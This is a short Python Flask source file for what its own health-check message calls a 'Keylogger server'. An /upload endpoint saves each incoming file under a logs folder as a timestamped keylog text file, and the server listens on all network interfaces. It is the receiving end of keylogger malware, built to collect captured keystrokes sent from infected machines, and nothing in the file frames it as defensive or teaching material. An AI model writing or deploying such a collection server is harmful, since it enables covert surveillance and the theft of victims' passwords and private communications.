from flask import Flask, request
import os
import datetime

app = Flask(__name__)
os.makedirs("logs", exist_ok=True)


@app.route('/', methods=['GET'])
def health_check():
    return "Keylogger server is running", 200


@app.route('/upload', methods=['POST'])
def upload():
    file = request.files.get('file')
    if not file:
        return "No file part", 400

    now = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    filename = f"keylog_{now}.txt"
    path = os.path.join("logs", filename)

    file.save(path)
    print(f"[✓] Received and saved to {path}")
    return "File received", 200


if __name__ == "__main__":
    port = int(os.environ.get('PORT', 9000))
    app.run(host='0.0.0.0', port=port)
